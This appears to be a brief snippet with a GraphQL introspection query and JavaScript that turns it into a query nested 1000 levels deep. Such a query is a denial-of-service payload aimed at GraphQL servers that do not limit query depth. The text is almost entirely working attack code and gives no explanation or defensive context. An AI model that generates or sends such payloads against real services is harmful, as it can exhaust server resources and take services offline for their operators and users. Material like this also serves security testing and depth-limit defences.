`query allSchemaTypes {  
    __schema {  
        types {  
            fields {
                type {
                  name
                }
            }
        }
    }
}`


let query = `query allSchemaTypes{__schema{types{`

query += 'fields{type{'.repeat(1000)

query += 'name'

query += '}}}'

query += '}}'.repeat(1000)

console.log(query);